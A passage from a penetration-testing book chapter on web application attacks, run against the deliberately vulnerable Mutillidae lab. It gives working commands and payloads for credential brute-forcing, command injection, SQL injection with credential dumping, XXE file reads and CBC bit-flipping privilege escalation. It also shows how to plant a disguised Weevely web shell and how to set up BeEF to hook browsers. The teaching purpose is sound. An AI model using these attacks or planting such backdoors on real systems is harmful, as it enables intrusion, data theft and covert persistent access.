    <p class="normal">Application-specific <a id="_idIndexMarker800"/>attacks outnumber attacks against specific operating systems. When you consider the misconfigurations, vulnerabilities, and logic errors that can affect each online application, it is surprising that any application can be considered secure.</p>
    <p class="normal">We will highlight some of the more important attacks against web services.</p>
    <h2 id="_idParaDest-192" class="heading-2">Brute-forcing access credentials</h2>
    <p class="normal">One of the most <a id="_idIndexMarker801"/>common initial<a id="_idIndexMarker802"/> attacks against a website or its services is a brute-force attack against access authentication, guessing the username and password. This attack has a high success rate because users tend to select easy-to-remember credentials or reuse credentials, and also because system administrators frequently don’t control multiple access attempts.</p>
    <p class="normal">Kali comes with <code class="inlineCode">hydra</code>, a command-line tool, and <code class="inlineCode">hydra-gtk</code>, which has a GUI interface. Both tools allow a tester to brute-force or iterate possible usernames and passwords against a specified service. Multiple communication protocols are supported, including FTP, FTPS, HTTP, HTTPS, ICQ, IRC, LDAP, MySQL, Oracle, POP3, pcAnywhere, SNMP, SSH, VNC, and others.</p>
    <p class="normal">The following screenshot shows <code class="inlineCode">hydra</code> using a brute-force attack to determine the access credentials on an HTTP page:</p>
    <pre class="programlisting con"><code class="hljs-con">hydra -l admin -P &lt;Yourpasswordlist&gt; 10.10.10.100 http-post-form "/mutillidae/index.php page=login.php:username=^USER^&amp;password=^PASS^&amp;login-php-submit-button=Login:Not Logged In"Injection
</code></pre>
    <p class="normal">In the coming section, we will explore common injection attacks that are exploited by attackers in general.</p>
    <h3 id="_idParaDest-193" class="heading-3">OS command injection using commix</h3>
    <p class="normal"><strong class="keyWord">Command injection exploiter</strong> (<strong class="keyWord">commix</strong>) is an<a id="_idIndexMarker803"/> automated <a id="_idIndexMarker804"/>tool <a id="_idIndexMarker805"/>written in Python that is pre-compiled in Kali Linux to perform various OS commands if the application is vulnerable to command injection. </p>
    <p class="normal">It allows attackers to inject into any specific vulnerable parts of the application, or even into an HTTP header.</p>
    <p class="normal">commix also comes <a id="_idIndexMarker806"/>as an additional plugin in various penetration testing frameworks such as TrustedSec’s <strong class="keyWord">PenTesters Framework</strong> (<strong class="keyWord">PTF</strong>) and<a id="_idIndexMarker807"/> OWASP’s <strong class="keyWord">Offensive Web Testing Framework</strong> (<strong class="keyWord">OWTF</strong>).</p>
    <p class="normal">Attackers may use all the functionalities provided by commix by entering <code class="inlineCode">commix -h</code> in the terminal.</p>
    <p class="normal">To simulate an exploit, execute the following command in the terminal on the targeted vulnerable web server:</p>
    <pre class="programlisting con"><code class="hljs-con">commix --url=http://YourIP/mutillidae/index.php popupnotificationcode=5L5&amp;page=dns-lookup.php --data="target_host=INJECT_HERE" -headers="Accept-Language:fr\n ETAG:123\n"
</code></pre>
    <p class="normal">When the commix tool is run against the vulnerable URL, penetration testers should be able to see the progress of command execution on the target server and also be able to see which parameter is vulnerable. In the preceding scenario, <code class="inlineCode">target_host</code> is the variable that was<a id="_idIndexMarker808"/> injectable<a id="_idIndexMarker809"/> using <a id="_idIndexMarker810"/>classic injection techniques, as shown in <em class="italic">Figure 7.18</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_18.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.18: Command injection using commix</p>
    <p class="normal">Once the injection is successful, attackers can run commands on the server, for example, <code class="inlineCode">dir</code> to list all the files and folders, as shown in <em class="italic">Figure 7.19</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_19.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.19: Remote command execution using commix on the remote system</p>
    <p class="normal">Testers<a id="_idIndexMarker811"/> must<a id="_idIndexMarker812"/> be <a id="_idIndexMarker813"/>careful while running commix on web applications on a shared infrastructure as it can cause a significant load “on” the memory of the hosting server.</p>
    <h3 id="_idParaDest-194" class="heading-3">sqlmap</h3>
    <p class="normal">The most <a id="_idIndexMarker814"/>common <a id="_idIndexMarker815"/>and exploitable vulnerability in websites is the injection vulnerability, which occurs when the victim site does not monitor user input, thereby allowing the attacker to interact with backend systems. An attacker can craft the input data to modify or steal content from a database, place an executable onto the server, or issue commands to the operating system.</p>
    <p class="normal">One of the most useful and powerful tools for assessing SQL injection vulnerabilities is <code class="inlineCode">sqlmap</code>, a Python tool that automates the reconnaissance and exploitation of Firebird, Microsoft SQL, MySQL (now called MariaDB, a community-developed and commercially supported fork of MySQL), Oracle, PostgreSQL, Sybase, and SAP MaxDB databases.</p>
    <p class="normal">We’ll demonstrate an SQL injection attack against the Mutillidae database. The first step is to determine the web server, the backend database management system, and the available databases.</p>
    <p class="normal">Access the Mutillidae website and review the web pages to identify ones that accept user input (for example, the user login form that accepts a username and password from a remote user); these pages may be vulnerable to SQL injection.</p>
    <p class="normal">Then, open Kali and from the terminal, enter the following (using the appropriate target IP address):</p>
    <pre class="programlisting con"><code class="hljs-con">root@kali:~# sqlmap -u 'http://targetip/mutillidae/index.php?page=user-  info.php&amp;username=admin&amp;password=&amp;user-info-php-submit-  button=View+Account+Details' --dbs
</code></pre>
    <p class="normal"><code class="inlineCode">sqlmap</code> will <a id="_idIndexMarker816"/>return <a id="_idIndexMarker817"/>data, as shown in <em class="italic">Figure 7.20</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_20.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.20: Output of sqlmap execution on the vulnerable link</p>
    <p class="normal">The most<a id="_idIndexMarker818"/> likely<a id="_idIndexMarker819"/> database to store the application’s data is the Mutillidae database; therefore, we will check for all the tables of that database using the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">root@kali:~# sqlmap -u "http://yourip/mutillidae/index.php?page=user-info.php&amp;username=&amp;password=&amp;user-info-php-submit-button=View+Account+Details" -D mutillidae --tables
</code></pre>
    <p class="normal">The data returned from executing that command is shown in <em class="italic">Figure 7.21</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_21.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.21: Listing all the tables from the Mutillidae database using sqlmap</p>
    <p class="normal">Of all the tables<a id="_idIndexMarker820"/> that were enumerated, one was<a id="_idIndexMarker821"/> titled <code class="inlineCode">accounts</code>. We will attempt to dump the data from this part of the table. If successful, the account credentials will allow us to return to the database if further SQL injection attacks fail.</p>
    <p class="normal">To dump the credentials, use the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">root@kali:~# sqlmap -u "http://yourip/mutillidae/index.php?page=user-info.php&amp;username=&amp;password=&amp;user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts --dump 
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_07_22.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.22: Dumping all the contents of a table within a selected database</p>
    <p class="normal">The <a id="_idIndexMarker822"/>above <a id="_idIndexMarker823"/>example focused on the HTTP <code class="inlineCode">GET</code> parameter. However, attackers can utilize the HTTP <code class="inlineCode">POST</code> parameter as well using any proxy tool and capture the complete <code class="inlineCode">POST</code> from the client, copy it into a file, and then run <code class="inlineCode">sudo sqlmap –r filename</code>, as shown in <em class="italic">Figure 7.23</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_23.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.23: Running sqlmap with the HTTP POST method</p>
    <p class="normal">Similar attacks can be used against the database to extract credit card numbers or other confidential information to achieve the objective of the penetration testing or red team exercise. </p>
    <p class="normal">Attackers <a id="_idIndexMarker824"/>can also choose to run command execution<a id="_idIndexMarker825"/> using <code class="inlineCode">sqlmap</code> by using <code class="inlineCode">–os-shell</code> to switch to the <code class="inlineCode">sqlmap</code> command in the terminal.</p>
    <h3 id="_idParaDest-195" class="heading-3">XML injection</h3>
    <p class="normal">Nowadays, there<a id="_idIndexMarker826"/> are plenty of applications <a id="_idIndexMarker827"/>using <strong class="keyWord">Extensible Markup Language</strong> (<strong class="keyWord">XML</strong>), which defines a set of rules for encoding <a id="_idIndexMarker828"/>documents that can be understood by both humans and machines. XML injection is a way to exploit the logic of an XML app or service by injecting unexpected messages into the XML structure or contents.</p>
    <p class="normal">In this section, we will explore how to perform XML injection, and successfully gain access to the underlying operating system by exploiting the typical misconfigurations that are left by developers.</p>
    <p class="normal">Follow these steps to identify whether an XML injection is possible or not:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Go to <code class="inlineCode">http:/Your IP/mutillidae/index.php?page=xml-validator.php</code>, as shown in <em class="italic">Figure 7.24</em>:<figure class="mediaobject"><img src="../Images/B17765_07_24.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.24: XML validation on Mutillidae</p>
      </li>
      <li class="numberedList">Check <a id="_idIndexMarker829"/>whether we are getting a<a id="_idIndexMarker830"/> valid response or not by entering the following in the form:
        <pre class="programlisting code"><code class="hljs-code"><span class="hljs-meta">&lt;!DOCTYPE </span><span class="hljs-meta-keyword">foo</span><span class="hljs-meta"> [ &lt;!ENTITY </span><span class="hljs-meta-keyword">Variable</span><span class="hljs-meta"> </span><span class="hljs-meta-string">"hello"</span><span class="hljs-meta"> &gt; ]&gt;</span><span class="hljs-tag">&lt;</span><span class="hljs-name">somexml</span><span class="hljs-tag">&gt;&lt;</span><span class="hljs-name">message</span><span class="hljs-tag">&gt;</span><span class="hljs-symbol">&amp;Variable;</span><span class="hljs-tag">&lt;/</span><span class="hljs-name">message</span><span class="hljs-tag">&gt;&lt;/</span><span class="hljs-name">somexml</span><span class="hljs-tag">&gt;</span>
</code></pre>
        <p class="normal">The previous code should display <code class="inlineCode">Hello</code> as a response, as shown in <em class="italic">Figure 7.25</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_07_25.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.25: Successful response from the server on the XML submitted</p>
      </li>
      <li class="numberedList">If the server<a id="_idIndexMarker831"/> is responding without <a id="_idIndexMarker832"/>an error message, it might potentially be vulnerable to XML injection.</li>
      <li class="numberedList">Now, we can create a payload by adding <code class="inlineCode">SYSTEM</code> to the variable and calling a local file:
        <pre class="programlisting code"><code class="hljs-code"><span class="hljs-meta">&lt;!DOCTYPE </span><span class="hljs-meta-keyword">foo</span><span class="hljs-meta"> [ &lt;!ENTITY </span><span class="hljs-meta-keyword">testref</span><span class="hljs-meta"> </span><span class="hljs-meta-keyword">SYSTEM</span><span class="hljs-meta"> </span><span class="hljs-meta-string">"file:///c:/windows/win.ini"</span><span class="hljs-meta"> &gt; ]&gt;</span>
<span class="hljs-tag">&lt;</span><span class="hljs-name">somexml</span><span class="hljs-tag">&gt;&lt;</span><span class="hljs-name">message</span><span class="hljs-tag">&gt;</span><span class="hljs-symbol">&amp;testref;</span><span class="hljs-tag">&lt;/</span><span class="hljs-name">message</span><span class="hljs-tag">&gt;&lt;/</span><span class="hljs-name">somexml</span><span class="hljs-tag">&gt;</span>
</code></pre>
        <p class="normal">If successful, you should be able to see the contents of the file that was called, as<a id="_idIndexMarker833"/> follows:</p>
        <figure class="mediaobject"><img src="../Images/B17765_07_26.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.26: XML injection successfully displaying the win.ini file contents in the server response</p>
      </li>
    </ol>
    <p class="normal">Attackers can <a id="_idIndexMarker834"/>potentially run a PowerShell exploit by <a id="_idIndexMarker835"/>gaining direct access to the entire system and laterally moving within the target network.</p>
    <h3 id="_idParaDest-196" class="heading-3">Bit-flipping attack</h3>
    <p class="normal">The majority <a id="_idIndexMarker836"/>of attackers do not focus much <a id="_idIndexMarker837"/>on crypto-type attacks as it is time consuming and requires significant computing power to crack the cipher text to extract meaningful information. But in some cases, the logic of the cryptography implemented can be understood easily.</p>
    <p class="normal">In this section, we will explore bit-flipping attacks, which use <strong class="keyWord">Cipher Block Chaining</strong> (<strong class="keyWord">CBC</strong>) to encrypt the given plaintext. </p>
    <p class="normal">In CBC, before you encrypt a block, the plaintext will be XOR’ed with the encrypted output of the previous block by creating a logical chain of blocks, as shown in <em class="italic">Figure 7.27</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_27.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.27: Initialization vector encryption using CBC</p>
    <p class="normal">In a nutshell, XOR compares two values and returns <code class="inlineCode">true</code> if they are different.</p>
    <p class="normal">What is the potential attack scenario here? If anyone can XOR the plaintext block with the encrypted message from the previous block, what would be the XOR input for the first block? All you need is an initialization vector. Access Mutillidae by navigating to <strong class="screenText">OWASP 2017</strong> &gt; <strong class="screenText">A1 - Injection (Other)</strong> &gt; <strong class="screenText">CBC bit flipping</strong>:</p>
    <pre class="programlisting code"><code class="hljs-code">http://yourip/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=6bc24fc1ab650b25b4114e93a98f1eba
</code></pre>
    <p class="normal">Testers should <a id="_idIndexMarker838"/>be able to land on the following<a id="_idIndexMarker839"/> page, as seen in <em class="italic">Figure 7.28</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_28.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.28: Default value accessing the CBC bit-flipping page</p>
    <p class="normal">As we can see, the current app user is running with User ID <code class="inlineCode">100</code> and Group ID <code class="inlineCode">100</code>. You need to be user <code class="inlineCode">000</code> in group <code class="inlineCode">000</code> to become the highly privileged root user.</p>
    <p class="normal">The only thing we need to manipulate is the IV value, <code class="inlineCode">6bc24fc1ab650b25b4114e93a98f1eba</code>. As it is hexadecimal and 32 characters long, the length is 128 bits. We start assessing the initialization vector by splitting the value into two characters as a block and change the value in the URL by accessing them one by one:</p>
    <ul>
      <li class="bulletList"><code class="inlineCode">http://yourIP/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=</code><code style="font-weight: bold;" class="codeHighlighted">00</code><code class="inlineCode">c24fc1ab650b25b4114e93a98f1eba</code>: No change to the User or Group ID</li>
      <li class="bulletList"><code class="inlineCode">http://YourIP/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=6b</code><code style="font-weight: bold;" class="codeHighlighted">00</code><code class="inlineCode">4fc1ab650b25b4114e93a98f1eba</code>: No change to the User or Group ID</li>
    </ul>
    <p class="normal">When we get to <a id="_idIndexMarker840"/>the<a id="_idIndexMarker841"/> fifth block, <code class="inlineCode">6bc24fc100650b25b4114e93a98f1eba</code>, we see a change in the User ID, as shown in <em class="italic">Figure 7.29</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_29.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.29: Manipulation of the encrypted data and a change to the user ID</p>
    <p class="normal">Testers can utilize Python 2 (since the hex is not available in Python 3) to generate the hex value for us, as shown here. Type <code class="inlineCode">python</code> in the Kali terminal, which should bring us to the Python shell 2.7.18 as default. We will XOR the value to give us the result, <code class="inlineCode">000</code>:</p>
    <pre class="programlisting con"><code class="hljs-con"><span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-built_in">print</span> <span class="hljs-con-built_in">hex</span>(<span class="hljs-con-number">0XAB</span> ^ <span class="hljs-con-number">0X31</span>)
0x9a
<span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-built_in">print</span> <span class="hljs-con-built_in">hex</span>(<span class="hljs-con-number">0X9A</span> ^ <span class="hljs-con-number">0X31</span>)
0xab
<span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-built_in">print</span> <span class="hljs-con-built_in">hex</span>(<span class="hljs-con-number">0X9A</span> ^ <span class="hljs-con-number">0X30</span>)
0xaa
</code></pre>
    <p class="normal">To become a root user, both the Group ID and User ID need to be <code class="inlineCode">000</code>, so we repeat the same on all the <a id="_idIndexMarker842"/>blocks until the value <a id="_idIndexMarker843"/>changes. Finally, we get the eighth block, <code class="inlineCode">6bc24fc1ab650b</code><code style="font-weight: bold;" class="codeHighlighted">14</code><code class="inlineCode">b4114e93a98f1eba</code>, which changed the Group ID; now, we do the same as we did for the User ID:</p>
    <pre class="programlisting con"><code class="hljs-con">kali@kali:~# python
Type "help", "copyright", "credits" or "license" for more information
<span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-built_in">print</span> <span class="hljs-con-built_in">hex</span>(<span class="hljs-con-number">0X25</span> ^ <span class="hljs-con-number">0X31</span>)
0x14
<span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-built_in">print</span> <span class="hljs-con-built_in">hex</span>(<span class="hljs-con-number">0X14</span> ^ <span class="hljs-con-number">0X30</span>)
0x24
<span class="hljs-con-meta">&gt;&gt;&gt;</span> exit()
</code></pre>
    <p class="normal">This gives us the following key: <code class="inlineCode">6bc24fc1</code><code style="font-weight: bold;" class="codeHighlighted">aa</code><code class="inlineCode">650b</code><code style="font-weight: bold;" class="codeHighlighted">24</code><code class="inlineCode">b4114e93a98f1eba</code>. When you pass the IV with the new value, you should now gain access to the application with enhanced privileges, as shown in <em class="italic">Figure 7.30</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_30.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.30: Bypass of user privilege by shifting the right value of the encryption</p>
    <p class="normal">Even if the encryption is enabled at the highest level, such as TLS1.3, if the application accepts or <a id="_idIndexMarker844"/>performs authentication through<a id="_idIndexMarker845"/> an HTTP <code class="inlineCode">GET</code> method, attackers could potentially exploit network devices such as routers and still be able to capture all the URL parameters. </p>
    <h3 id="_idParaDest-197" class="heading-3">Maintaining access with web shells</h3>
    <p class="normal">Once a web <a id="_idIndexMarker846"/>server <a id="_idIndexMarker847"/>and its services have been compromised, it is important to ensure that secure access can be maintained. This is usually accomplished with the aid of a web shell, a small program that provides stealth backdoor access and allows the use of system commands to facilitate post-exploitation activities.</p>
    <p class="normal">Kali comes with several web shells; here, we will use a popular PHP web shell called <strong class="keyWord">Weevely</strong>. For other <a id="_idIndexMarker848"/>technologies, attackers can leverage all the pre-collected web shells in Kali Linux that are stored in the <code class="inlineCode">/usr/share/webshells</code> folder. </p>
    <p class="normal">Weevely simulates a Telnet session and allows the tester or attacker to take advantage of more than 30 modules for post-exploitation tasks, including the following:</p>
    <ul>
      <li class="bulletList">Browsing the target filesystem</li>
      <li class="bulletList">File transfer to and from the compromised system</li>
      <li class="bulletList">Performing audits for common server misconfigurations</li>
      <li class="bulletList">Brute-forcing SQL accounts through the target system</li>
      <li class="bulletList">Spawning reverse TCP shells</li>
      <li class="bulletList">Executing commands on remote systems that have been compromised, even if PHP security restrictions have been applied</li>
    </ul>
    <p class="normal">Finally, Weevely <a id="_idIndexMarker849"/>endeavors <a id="_idIndexMarker850"/>to hide communications in HTTP cookies to avoid detection. To create Weevely, issue the following command from the command prompt:</p>
    <pre class="programlisting gen"><code class="hljs">sudo weevely generate &lt;password&gt; &lt;path&gt;
</code></pre>
    <p class="normal">This will create the <code class="inlineCode">404.php</code> file in the <code class="inlineCode">/home/kali</code> directory of the path that you enter. Attackers can choose their own name during the penetration testing activity, however, filenames such as <code class="inlineCode">404</code>, <code class="inlineCode">403</code>, and <code class="inlineCode">302</code> typically indicate a page that is served based on the client request, which will look less suspicious to the security monitoring blue teams. <em class="italic">Figure 7.31</em> provides instructions on how to run <code class="inlineCode">weevely</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_31.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.31: Creating a PHP backdoor file with a password using Weevely</p>
    <p class="normal">Navigate<a id="_idIndexMarker851"/> to <strong class="screenText">OWASP 2017</strong> &gt; <strong class="screenText">A6 -security misconfiguration </strong>&gt; <strong class="screenText">unrestricted file upload</strong>. We will be<a id="_idIndexMarker852"/> exploiting the file upload vulnerability on Mutillidae. Upload <code class="inlineCode">404.php</code>, which we created using <code class="inlineCode">weevely</code>, to the website, as shown in <em class="italic">Figure 7.32</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_32.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.32: Uploading the backdoor PHP file to our target application</p>
    <p class="normal">To communicate<a id="_idIndexMarker853"/> with the <a id="_idIndexMarker854"/>web shell, issue the following command from the Command Prompt, ensuring that the target IP <code class="inlineCode">address</code>, <code class="inlineCode">directory</code>, and <code class="inlineCode">password</code> variables are changed to reflect those of the compromised system:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo weevely http://&lt;target IP address&gt;&lt;directory&gt; &lt;password&gt;
</code></pre>
    <p class="normal">In the example shown in <em class="italic">Figure 7.33</em>, we have verified that we are connected to the web shell using the <code class="inlineCode">whoami</code> command (which identifies the current system):</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_33.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.33: Successfully running the commands on the target as a high-privilege user through the backdoor</p>
    <p class="normal">The web shell<a id="_idIndexMarker855"/> can also be <a id="_idIndexMarker856"/>used to establish a reverse shell connection back to the tester, using either <code class="inlineCode">netcat</code> or the Metasploit framework as the local listener. This can be utilized to attack further inside the network by escalating privileges horizontally and vertically.</p>
    <p class="normal">Unfortunately, the Weevely backdoors will work only in PHP versions lower than 7.2.x. If the target website is running 7.3 to 8.x, attackers can leverage the readily available backdoor that can be downloaded from <a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/tree/main/Chapter%2007/backdoor.php"><span class="url">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/tree/main/Chapter%2007/backdoor.php</span></a> and upload the file to the same location as we did in <em class="italic">Figure 7.32</em>. We should now be able to see the backdoor <a id="_idIndexMarker857"/>working,<a id="_idIndexMarker858"/> as shown in <em class="italic">Figure 7.34</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_07_34.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.34: Running a backdoor on the latest versions of PHP</p>
    <h1 id="_idParaDest-198" class="heading-1">The Browser Exploitation Framework (BeEF)</h1>
    <p class="normal">BeEF is an exploitation<a id="_idIndexMarker859"/> tool that focuses on a specific client-side application and the web browser. BeEF allows an attacker to inject JavaScript code into vulnerable HTML code using an attack such as XSS or SQL injection. This exploit code is <a id="_idIndexMarker860"/>known as a <strong class="keyWord">hook</strong>. A compromise is achieved when the hook is executed by the browser. The browser (<strong class="keyWord">zombie</strong>) connects back to the BeEF application, which serves JavaScript commands or modules to the browser.</p>
    <p class="normal">BeEF’s modules perform tasks such as the following:</p>
    <ul>
      <li class="bulletList">Fingerprinting and the reconnaissance of compromised browsers. It can also be used as a platform to assess the presence of exploits and their behavior under different browsers.
    <p class="normal"> </p>
    <div class="note">
      <p class="normal">Note that BeEF allows us to hook multiple browsers on the same client, as well as multiple clients across a domain, and then manage them during the exploitation and post-exploitation phases.</p>
    </div>
</li>
    </ul>
    <ul>
      <li class="bulletList">Fingerprinting the target host, including the presence of virtual machines.</li>
      <li class="bulletList">Detecting software on the client (Internet Explorer only) and obtaining a list of the directories in the <code class="inlineCode">Program Files</code> and <code class="inlineCode">Program Files (x86)</code> directories. This may identify other applications that can be exploited to consolidate our hold on the client.</li>
      <li class="bulletList">Taking photos using the compromised system’s webcam; these photos have a significant impact on reports.</li>
      <li class="bulletList">Conducting searches of the victim’s data files and stealing data that may contain authentication credentials (clipboard content and browser cookies) or other useful information.</li>
      <li class="bulletList">Implementing browser keystroke logging.</li>
      <li class="bulletList">Conducting network reconnaissance using ping sweeps and fingerprint network appliances and scanning for open ports.</li>
      <li class="bulletList">Launching attacks from the Metasploit framework.</li>
      <li class="bulletList">Using the tunneling proxy extension to attack the internal network using the security authority of the compromised web browser.</li>
    </ul>
    <p class="normal">Because BeEF is written<a id="_idIndexMarker861"/> in Ruby, it supports multiple operating systems (Linux, Windows, and macOS). More importantly, it is easy to customize new modules in BeEF and extend its functionality.</p>
    <h2 id="_idParaDest-199" class="heading-2">Installing and configuring BeEF</h2>
    <p class="normal">BeEF is <a id="_idIndexMarker862"/>not<a id="_idIndexMarker863"/> installed by default in Kali distributions. It can be directly downloaded from <a href="https://github.com/beefproject/beef"><span class="url">https://github.com/beefproject/beef</span></a>. This application can be installed in three simple steps:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Run <code class="inlineCode">sudo git clone https://github.com/beefproject/beef </code>in the terminal</li>
      <li class="numberedList">Change the folder with <code class="inlineCode">cd beef</code></li>
      <li class="numberedList">Install the dependencies and all relevant packages by running <code class="inlineCode">sudo ./install</code> from the terminal</li>
      <li class="numberedList">Finally, run <code class="inlineCode">sudo bundle install</code> to install the relevant Ruby gems and packages</li>
    </ol>
    <div class="note">
      <p class="normal">If testers receive any error messages during the BeEF installation (<em class="italic">step 3</em>), particularly relating to unmet dependencies such as <code class="inlineCode">libgcc-9-dev</code>, it is recommended that they add the following repositories to the /<code class="inlineCode">etc/apt/sources.list</code> file, then run <code class="inlineCode">sudo apt update</code>, and finally, execute <code class="inlineCode">sudo ./install</code>:</p>
      <p class="normal"><code class="inlineCode">deb http://http.kali.org/kali kali-last-snapshot main non-free contrib</code></p>
      <p class="normal"><code class="inlineCode">deb http://http.kali.org/kali kali-experimental main non-free contrib</code></p>
      <p class="normal"><code class="inlineCode">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></p>
    </div>
    <p class="normal">By default, BeEF<a id="_idIndexMarker864"/> is <a id="_idIndexMarker865"/>not integrated with the Metasploit framework. To integrate BeEF, you will need to perform the following steps:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Edit the main configuration file located in the same folder where you downloaded/cloned BeEF and open <code class="inlineCode">config.yaml</code> with <code class="inlineCode">sudo</code> privileges to edit the contents. The BeEF application will not launch if the username and password are not changed, so it is recommended that testers change the default credentials as the first step, as seen in <em class="italic">Figure 7.35</em>:<figure class="mediaobject"><img src="../Images/B17765_07_35.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.35: Changing the default credentials of the BeEF application</p>
      </li>
      <li class="numberedList">Edit<a id="_idIndexMarker866"/> the <a id="_idIndexMarker867"/>file located at /<code class="inlineCode">Beef/extensions/metasploit/config.yml</code>. By default, everything is set to localhost (<code class="inlineCode">127.0.0.1</code>). In case you’re running the Metasploit service over a LAN, you will need to edit the <code class="inlineCode">host</code>, <code class="inlineCode">callback_host</code>, and <code class="inlineCode">os 'custom', path</code> lines to include your IP address and the location for the Metasploit framework. A correctly edited <code class="inlineCode">config.yml</code> file is shown in <em class="italic">Figure 7.36</em>:<figure class="mediaobject"><img src="../Images/B17765_07_36.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.36: Configuring the BeEF extension with the Metasploit framework</p>
      </li>
      <li class="numberedList">Start <code class="inlineCode">msfconsole</code>, and<a id="_idIndexMarker868"/> load <a id="_idIndexMarker869"/>the <code class="inlineCode">msgrpc</code> module, as shown in <em class="italic">Figure 7.37</em>. Make sure that you include the password as well:<figure class="mediaobject"><img src="../Images/B17765_07_37.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.37: Allowing the MSGRPC service on the network IP with a custom password</p>
      </li>
      <li class="numberedList">Start BeEF by using the following command from the same location where the application is downloaded:
        <pre class="programlisting con"><code class="hljs-con">sudo ./beef
</code></pre>
      </li>
      <li class="numberedList">Confirm <a id="_idIndexMarker870"/>startup<a id="_idIndexMarker871"/> by reviewing the messages generated during program launch. They should indicate that a successful connection with Metasploit occurred, which will be accompanied by an indication that Metasploit exploits have been loaded. A successful program launch is shown in <em class="italic">Figure 7.38</em>:<figure class="mediaobject"><img src="../Images/B17765_07_38.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.38: Successful launch of the BeEF application</p>
      </li>
    </ol>
    <div class="packt_tip">
      <p class="normal">When you restart BeEF, use the <code class="inlineCode">-x</code> switch to reset the database.</p>
    </div>
    <p class="normal">In this example, the BeEF server is running on <code class="inlineCode">10.10.10.12</code> and the hook URL (the one that we want the target to activate) is <code class="inlineCode">10.10.10.12:3000/hook.js</code>.</p>
    <p class="normal">Most of the administration and management of BeEF is done via the web interface. To access the control panel, go to <code class="inlineCode">http://&lt;IP Address&gt;:3000/ui/panel</code>.</p>
    <p class="normal">Attackers should be<a id="_idIndexMarker872"/> taken<a id="_idIndexMarker873"/> to the following screenshot; the login credentials will be as entered in <code class="inlineCode">config.yaml</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_39.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.39: Authenticating to the BeEF application</p>
    <h1 id="_idParaDest-200" class="heading-1">Understanding the BeEF browser</h1>
    <p class="normal">When the BeEF<a id="_idIndexMarker874"/> control panel is launched, it will present the <strong class="screenText">Getting Started</strong> screen, featuring links to the online site as well as the demonstration pages that can be used to validate the various attacks. The BeEF control panel is shown in <em class="italic">Figure 7.40</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_40.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.40: BeEF browser following successful authentication</p>
    <p class="normal">If you have hooked a victim, the interface will be divided into two panels:</p>
    <ul>
      <li class="bulletList">On the left-hand side of the panel, we have <strong class="screenText">Hooked Browsers</strong>; the tester can see every connected browser listed with information about its host operating system, browser type, IP address, and installed plugins. Because BeEF sets a cookie to identify victims, it can refer to this information and maintain a consistent list of victims.</li>
      <li class="bulletList">The right-hand side of the panel is where all of the actions are initiated, and the results are obtained. In the <strong class="screenText">Commands</strong> tab, we see a categorized repository of the different attack vectors that can be used against hooked browsers. This view will differ based on the type and version of each browser.</li>
    </ul>
    <p class="normal">BeEF uses a color-coding scheme to characterize the commands on the basis of their usability against a <a id="_idIndexMarker875"/>particular target. The colors used are as follows:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Green</strong>: This indicates<a id="_idIndexMarker876"/> that the command module works against the target and should be invisible to the victim.</li>
      <li class="bulletList"><strong class="keyWord">Orange</strong>: This indicates that the command module works against the target, but it may be detected by the victim.</li>
      <li class="bulletList"><strong class="keyWord">Gray</strong>: This indicates that the command module is not yet verified against the target.</li>
